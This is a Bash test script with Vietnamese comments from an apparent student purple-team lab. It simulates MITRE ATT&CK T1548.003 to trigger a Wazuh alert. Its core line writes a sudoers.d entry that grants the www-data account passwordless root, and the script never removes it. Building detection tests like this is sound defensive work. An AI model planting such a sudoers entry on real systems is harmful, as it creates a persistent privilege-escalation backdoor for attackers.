#!/bin/bash
# =============================================================================
# Kịch bản kiểm thử T1548.003 - Privilege Escalation: Sudo Caching / Sudoers.d
# Đồ án: Purple Team Detection Engineering Lab
# Sinh viên: Nguyễn Minh Trí (MSSV: 92510340016)
# Kỹ thuật: MITRE ATT&CK T1548.003
# Quy tắc Wazuh đích: Rule 100012 (Level 12)
# =============================================================================

echo "[*] =========================================================="
echo "[*] THỰC THI MÔ PHỎNG T1548.003 - GHI NOPASSWD VÀO SUDOERS.D"
echo "[*] =========================================================="

if [ "$EUID" -ne 0 ]; then
  echo "[-] Cần quyền root hoặc sudo để thực thi kịch bản này (sudo bash test_t1548_003_sudoers.sh)"
  exit 1
fi

echo "[+] Bơm cấu hình leo thang đặc quyền NOPASSWD vào /etc/sudoers.d/malicious..."
echo "www-data ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/malicious
chmod 440 /etc/sudoers.d/malicious

echo ""
echo "[✓] Đã tạo tệp cấu hình độc hại! Vui lòng kiểm tra cảnh báo Rule 100012 trên Wazuh Dashboard."
